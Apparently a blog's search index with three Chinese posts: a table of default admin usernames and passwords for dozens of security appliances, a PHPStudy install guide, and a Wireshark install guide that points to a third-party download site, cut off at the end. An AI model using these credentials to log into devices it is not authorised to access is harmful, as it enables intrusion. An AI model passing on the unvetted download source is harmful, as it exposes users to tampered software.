<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>常见网络安全设备默认口令</title>
      <link href="/2024/12/16/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/"/>
      <url>/2024/12/16/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><font style="color:rgb(85, 85, 85);background-color:rgb(247, 247, 247) !important;">来源网络，具体网址找不到了 &#x3D; &#x3D;，如果作者看到这篇博客的话可以联系我添加声明。</font></p><p><font style="color:rgb(85, 85, 85);background-color:rgb(247, 247, 247) !important;">看到一个可以查询默认口令的</font><a href="http://www.sopwd.com/search/"><font style="color:rgb(85, 85, 85);background-color:rgb(247, 247, 247) !important;">网站</font></a></p><table><thead><tr><th align="left"><font style="color:rgb(34, 34, 34);">设备</font></th><th align="left"><font style="color:rgb(34, 34, 34);">默认账号</font></th><th align="left"><font style="color:rgb(34, 34, 34);">默认密码</font></th></tr></thead><tbody><tr><td align="left"><font style="color:rgb(34, 34, 34);">深信服产品</font></td><td align="left"><font style="color:rgb(34, 34, 34);">sangfor</font></td><td align="left"><font style="color:rgb(34, 34, 34);">sangfor sangfor@2018 sangfor@2019</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">深信服科技 AD</font></td><td align="left"></td><td align="left"><font style="color:rgb(34, 34, 34);">dlanrecover</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">深信服负载均衡 AD 3.6</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">深信服WAC ( WNS V2.6)</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">深信服VPN</font></td><td align="left"><font style="color:rgb(34, 34, 34);">Admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">Admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">深信服ipsec-VPN (SSL 5.5)</font></td><td align="left"><font style="color:rgb(34, 34, 34);">Admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">Admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">深信服AC6.0</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">SANGFOR防火墙</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">sangfor</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">深信服AF(NGAF V2.2)</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">sangfor</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">深信服NGAF下一代应用防火墙(NGAF V4.3)</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">深信服AD3.9</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">深信服上网行为管理设备数据中心</font></td><td align="left"><font style="color:rgb(34, 34, 34);">Admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">密码为空</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">SANGFOR_AD_v5.1</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">网御漏洞扫描系统</font></td><td align="left"><font style="color:rgb(34, 34, 34);">leadsec</font></td><td align="left"><font style="color:rgb(34, 34, 34);">leadsec</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">天阗入侵检测与管理系统 V7.0</font></td><td align="left"><font style="color:rgb(34, 34, 34);">Admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">venus70</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">Audit</font></td><td align="left"><font style="color:rgb(34, 34, 34);">venus70</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">adm</font></td><td align="left"><font style="color:rgb(34, 34, 34);">venus70</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">天阗入侵检测与管理系统 V6.0</font></td><td align="left"><font style="color:rgb(34, 34, 34);">Admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">venus60</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">Audit</font></td><td align="left"><font style="color:rgb(34, 34, 34);">venus60</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">adm</font></td><td align="left"><font style="color:rgb(34, 34, 34);">venus60</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">网御WAF集中控制中心(V3.0R5.0)</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">leadsec.waf</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">audit</font></td><td align="left"><font style="color:rgb(34, 34, 34);">leadsec.waf</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">adm</font></td><td align="left"><font style="color:rgb(34, 34, 34);">leadsec.waf</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">联想网御</font></td><td align="left"><font style="color:rgb(34, 34, 34);">administrator</font></td><td align="left"><font style="color:rgb(34, 34, 34);">administrator</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">网御事件服务器</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin123</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">联想网御防火墙PowerV</font></td><td align="left"><font style="color:rgb(34, 34, 34);">administrator</font></td><td align="left"><font style="color:rgb(34, 34, 34);">administrator</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">联想网御入侵检测系统</font></td><td align="left"><font style="color:rgb(34, 34, 34);">lenovo</font></td><td align="left"><font style="color:rgb(34, 34, 34);">default</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">网络卫士入侵检测系统</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">talent</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">网御入侵检测系统V3.2.72.0</font></td><td align="left"><font style="color:rgb(34, 34, 34);">adm</font></td><td align="left"><font style="color:rgb(34, 34, 34);">leadsec32</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">leadsec32</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">联想网御入侵检测系统IDS</font></td><td align="left"><font style="color:rgb(34, 34, 34);">root</font></td><td align="left"><font style="color:rgb(34, 34, 34);">111111</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin123</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">科来网络回溯分析系统</font></td><td align="left"><font style="color:rgb(34, 34, 34);">csadmin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">colasoft</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">中控考勤机web3.0</font></td><td align="left"><font style="color:rgb(34, 34, 34);">administrator</font></td><td align="left"><font style="color:rgb(34, 34, 34);">123456</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">H3C iMC</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">H3C SecPath系列</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">H3C S5120-SI</font></td><td align="left"><font style="color:rgb(34, 34, 34);">test</font></td><td align="left"><font style="color:rgb(34, 34, 34);">123</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">H3C智能管理中心</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">H3C ER3100</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">adminer3100</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">H3C ER3200</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">adminer3200</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">H3C ER3260</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">adminer3260</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">H3C</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">adminer</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">h3capadmin</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">h3c</font></td><td align="left"><font style="color:rgb(34, 34, 34);">h3c</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">360天擎</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">网神防火墙</font></td><td align="left"><font style="color:rgb(34, 34, 34);">firewall</font></td><td align="left"><font style="color:rgb(34, 34, 34);">firewall</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">天融信防火墙NGFW4000</font></td><td align="left"><font style="color:rgb(34, 34, 34);">superman</font></td><td align="left"><font style="color:rgb(34, 34, 34);">talent</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">黑盾防火墙</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">rule</font></td><td align="left"><font style="color:rgb(34, 34, 34);">abc123</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">audit</font></td><td align="left"><font style="color:rgb(34, 34, 34);">abc123</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">华为防火墙</font></td><td align="left"><font style="color:rgb(34, 34, 34);">telnetuser</font></td><td align="left"><font style="color:rgb(34, 34, 34);">telnetpwd</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">ftpuser</font></td><td align="left"><font style="color:rgb(34, 34, 34);">ftppwd</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">方正防火墙</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">飞塔防火墙</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">密码为空</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">Juniper_SSG__5防火墙</font></td><td align="left"><font style="color:rgb(34, 34, 34);">netscreen</font></td><td align="left"><font style="color:rgb(34, 34, 34);">netscreen</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">中新金盾硬件防火墙</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">123</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">kill防火墙(冠群金辰)</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">sys123</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">天清汉马USG防火墙</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">venus.fw</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">Audit</font></td><td align="left"><font style="color:rgb(34, 34, 34);">venus.audit</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">useradmin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">venus.user</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">阿姆瑞特防火墙</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">manager</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">山石网科</font></td><td align="left"><font style="color:rgb(34, 34, 34);">hillstone</font></td><td align="left"><font style="color:rgb(34, 34, 34);">hillstone</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">绿盟安全审计系统</font></td><td align="left"><font style="color:rgb(34, 34, 34);">weboper</font></td><td align="left"><font style="color:rgb(34, 34, 34);">weboper</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">webaudit</font></td><td align="left"><font style="color:rgb(34, 34, 34);">webaudit</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">conadmin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">conadmin</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">shell</font></td><td align="left"><font style="color:rgb(34, 34, 34);">shell</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">绿盟产品</font></td><td align="left"></td><td align="left"><font style="color:rgb(34, 34, 34);">nsfocus123</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">TopAudit日志审计系统</font></td><td align="left"><font style="color:rgb(34, 34, 34);">superman</font></td><td align="left"><font style="color:rgb(34, 34, 34);">talent</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">LogBase日志管理综合审计系统</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">safetybase</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">网神SecFox运维安全管理与审计系统</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">!1fw@2soc#3vpn</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">天融信数据库审计系统</font></td><td align="left"><font style="color:rgb(34, 34, 34);">superman</font></td><td align="left"><font style="color:rgb(34, 34, 34);">telent</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">Hillstone安全审计平台</font></td><td align="left"><font style="color:rgb(34, 34, 34);">hillstone</font></td><td align="left"><font style="color:rgb(34, 34, 34);">hillstone</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">网康日志中心</font></td><td align="left"><font style="color:rgb(34, 34, 34);">ns25000</font></td><td align="left"><font style="color:rgb(34, 34, 34);">ns25000</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">网络安全审计系统（中科新业）</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">123456</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">天玥网络安全审计系统</font></td><td align="left"><font style="color:rgb(34, 34, 34);">Admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">cyberaudit</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">明御WEB应用防火墙</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">adminadmin</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">明御攻防实验室平台</font></td><td align="left"><font style="color:rgb(34, 34, 34);">root</font></td><td align="left"><font style="color:rgb(34, 34, 34);">123456</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">明御安全网关</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">adminadmin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">明御运维审计与册风险控制系统</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">1q2w3e</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">system</font></td><td align="left"><font style="color:rgb(34, 34, 34);">1q2w3e4r</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">auditor</font></td><td align="left"><font style="color:rgb(34, 34, 34);">1q2w3e4r</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">operator</font></td><td align="left"><font style="color:rgb(34, 34, 34);">1q2w3e4r</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">明御网站卫士</font></td><td align="left"><font style="color:rgb(34, 34, 34);">sysmanager</font></td><td align="left"><font style="color:rgb(34, 34, 34);">sysmanager888</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">亿邮邮件网关</font></td><td align="left"><font style="color:rgb(34, 34, 34);">eyouuser</font></td><td align="left"><font style="color:rgb(34, 34, 34);">eyou_admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">eyougw</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin@(eyou)</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">+-ccccc</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">cyouadmin</font></td><td align="left"></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">Websense邮件安全网关</font></td><td align="left"><font style="color:rgb(34, 34, 34);">administrator</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr><tr><td align="left"><font style="color:rgb(34, 34, 34);">梭子鱼邮件存储网关</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td><td align="left"><font style="color:rgb(34, 34, 34);">admin</font></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPstudy的安装教程</title>
      <link href="/2024/12/16/PhpStudy%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2024/12/16/PhpStudy%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一：简介"><a href="#一：简介" class="headerlink" title="一：简介"></a><font style="color:rgb(85, 85, 85);">一：简介</font></h1><h3 id="phpStudy是一个PHP调试环境的程序集成包。"><a href="#phpStudy是一个PHP调试环境的程序集成包。" class="headerlink" title="phpStudy是一个PHP调试环境的程序集成包。"></a><font style="color:rgba(0, 0, 0, 0.85);">phpStudy是一个PHP调试环境的程序集成包。</font></h3><h3 id="该程序包集成最新的Apache-PHP-MySQL-phpMyAdmin-ZendOptimizer，一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。"><a href="#该程序包集成最新的Apache-PHP-MySQL-phpMyAdmin-ZendOptimizer，一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。" class="headerlink" title="该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。"></a><font style="color:rgba(0, 0, 0, 0.85);">该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。</font></h3><h3 id="该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等。"><a href="#该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等。" class="headerlink" title="该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等。"></a><font style="color:rgba(0, 0, 0, 0.85);">该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等。</font></h3><h1 id="二：安装步骤"><a href="#二：安装步骤" class="headerlink" title="二：安装步骤"></a><font style="color:rgb(85, 85, 85);">二：安装步骤</font></h1><h2 id="1-进入PHPStudy官网：https-www-xp-cn-根据自己系统版本进行选择"><a href="#1-进入PHPStudy官网：https-www-xp-cn-根据自己系统版本进行选择" class="headerlink" title="1.进入PHPStudy官网：https://www.xp.cn/ 根据自己系统版本进行选择"></a><font style="color:rgb(85, 85, 85);">1.进入PHPStudy官网：</font><a href="https://www.xp.cn/"><font style="color:rgb(85, 85, 85);">https://www.xp.cn/</font></a><font style="color:rgb(85, 85, 85);"> </font><font style="color:rgb(85, 85, 85);">根据自己系统版本进行选择</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134348467.png" alt="image-20241216134348305"></p><h2 id="2-点击-“立即下载”"><a href="#2-点击-“立即下载”" class="headerlink" title="2.点击 “立即下载”"></a><font style="color:rgb(85, 85, 85);">2.点击 “立即下载”</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134352996.png" alt="image-20241216134352870"></p><h2 id="3-先去创建一个安装路径（最好纯英文，不要有中文字符和空格），便于查找和管理"><a href="#3-先去创建一个安装路径（最好纯英文，不要有中文字符和空格），便于查找和管理" class="headerlink" title="3.先去创建一个安装路径（最好纯英文，不要有中文字符和空格），便于查找和管理"></a><font style="color:rgb(85, 85, 85);">3.先去创建一个安装路径（最好纯英文，不要有中文字符和空格），便于查找和管理</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134356622.png" alt="image-20241216134356548"></p><h2 id="4-双击打开安装包（看，它也提示不要有中文和空格-小声哔哔-jpg-）"><a href="#4-双击打开安装包（看，它也提示不要有中文和空格-小声哔哔-jpg-）" class="headerlink" title="4.双击打开安装包（看，它也提示不要有中文和空格(小声哔哔.jpg)）"></a><font style="color:rgb(85, 85, 85);">4.双击打开安装包（看，它也提示不要有中文和空格(小声哔哔.jpg)）</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134359642.png" alt="image-20241216134359569"></p><h2 id="5-不要点-“立即安装”，要点右下角-“自定义选项”"><a href="#5-不要点-“立即安装”，要点右下角-“自定义选项”" class="headerlink" title="5.不要点 “立即安装”，要点右下角 “自定义选项”"></a><font style="color:rgb(85, 85, 85);">5.不要点 “立即安装”，要点右下角 “自定义选项”</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134402402.png" alt="image-20241216134402291"></p><h2 id="6-点击-“浏览”，选择之前创建的安装路径，点击-“立即安装”"><a href="#6-点击-“浏览”，选择之前创建的安装路径，点击-“立即安装”" class="headerlink" title="6.点击 “浏览”，选择之前创建的安装路径，点击 “立即安装”"></a><font style="color:rgb(85, 85, 85);">6.点击 “浏览”，选择之前创建的安装路径，点击 “立即安装”</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134406662.png" alt="image-20241216134406563"></p><h2 id="7-稍待片刻"><a href="#7-稍待片刻" class="headerlink" title="7.稍待片刻"></a><font style="color:rgb(85, 85, 85);">7.稍待片刻</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134409483.png" alt="image-20241216134409343"></p><h2 id="8-点击-“安装完成”"><a href="#8-点击-“安装完成”" class="headerlink" title="8.点击 “安装完成”"></a><font style="color:rgb(85, 85, 85);">8.点击 “安装完成”</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134412269.png" alt="image-20241216134412194"></p><h2 id="9-开机自启-点击-“停用”，然后下面可以启动自己想启动的服务（品式繁多，任你选择）"><a href="#9-开机自启-点击-“停用”，然后下面可以启动自己想启动的服务（品式繁多，任你选择）" class="headerlink" title="9.开机自启 点击 “停用”，然后下面可以启动自己想启动的服务（品式繁多，任你选择）"></a><font style="color:rgb(85, 85, 85);">9.开机自启 点击 “停用”，然后下面可以启动自己想启动的服务（品式繁多，任你选择）</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134415294.png" alt="image-20241216134415176"></p><h2 id="10-点击左侧-“数据库”栏，还可以之间创建数据库和修改root密码"><a href="#10-点击左侧-“数据库”栏，还可以之间创建数据库和修改root密码" class="headerlink" title="10.点击左侧 “数据库”栏，还可以之间创建数据库和修改root密码"></a><font style="color:rgb(85, 85, 85);">10.点击左侧 “数据库”栏，还可以之间创建数据库和修改root密码</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134418078.png" alt="image-20241216134417992"></p><h2 id="11-点击左侧-“环境”栏还可以下载更多其他环境，也方便管理和卸载"><a href="#11-点击左侧-“环境”栏还可以下载更多其他环境，也方便管理和卸载" class="headerlink" title="11.点击左侧 “环境”栏还可以下载更多其他环境，也方便管理和卸载"></a><font style="color:rgb(85, 85, 85);">11.点击左侧 “环境”栏还可以下载更多其他环境，也方便管理和卸载</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134421770.png" alt="image-20241216134421677"></p><h2 id="12-最后说一句：phpStudy牛逼！"><a href="#12-最后说一句：phpStudy牛逼！" class="headerlink" title="12.最后说一句：phpStudy牛逼！"></a><font style="color:rgb(85, 85, 85);">12.最后说一句：phpStudy牛逼！</font></h2><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134425710.png" alt="image-20241216134425619"></p><p>下一篇我会讲解phpstudy搭建靶场的教程，希望大家想学的可以看一看哦</p><p><strong>教程如果有不清晰或不明白的地方，欢迎大家评论区留言讨论。</strong></p><p><strong>如果有什么不对或者需要改正的地方，请多多指教！欢迎讨论交流！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark的安装教程</title>
      <link href="/2024/12/16/Wireshark%E7%9A%84%E5%AE%89%E8%A3%85/"/>
      <url>/2024/12/16/Wireshark%E7%9A%84%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>在CTF比赛中或者是抓包中我们都会用到一个工具Wireshark，但是有很多小伙伴们刚入门安全，不知道该如何去安装这个wireshark，今天我就来教大家如何安装wireshark  <img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134443207.png" alt="image-20241216134442898">首先我们可以去getshell极核网站直接去下载wireshark，本人自从发现这个网站后一直都是在这边下的工具（有无后门自测）。<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134447731.png" alt="image-20241216134447506">在下边水一下就可以获得下载链接，因为我是站长送的会员所以可以直接下载，我们等待下载结束即可（但是我发现水一下居然比我这个会员下载的更快)<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134455351.png" alt="image-20241216134455268"></p><p>如果之前下载过就会显示是否要先将它卸载，选择是</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134458694.png" alt="image-20241216134458624"></p><p>点击下一步<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134502502.png" alt="image-20241216134502410"></p><p>点击noted</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134505420.png" alt="image-20241216134505328"></p><p>继续点击下一步<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134508445.png" alt="image-20241216134508284">这边也不需要勾选，直接下一步，默认配置即可<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134511446.png" alt="image-20241216134511289"></p><p>我们这边仍然选择默认配置即可（新手可以全部勾选，因为勾选了会有快捷方式，这样直接显示在桌面上）<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134515267.png" alt="image-20241216134515048">然后我们把他安装到我们指定的文件夹中即可<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134518345.png" alt="image-20241216134518265"></p><p>继续下一步<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134524448.png" alt="image-20241216134524284"></p><p>然后我们只要等待安装就可以了<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134527901.png" alt="image-20241216134527619">至此我们的wireshark安装就到此结束了<img 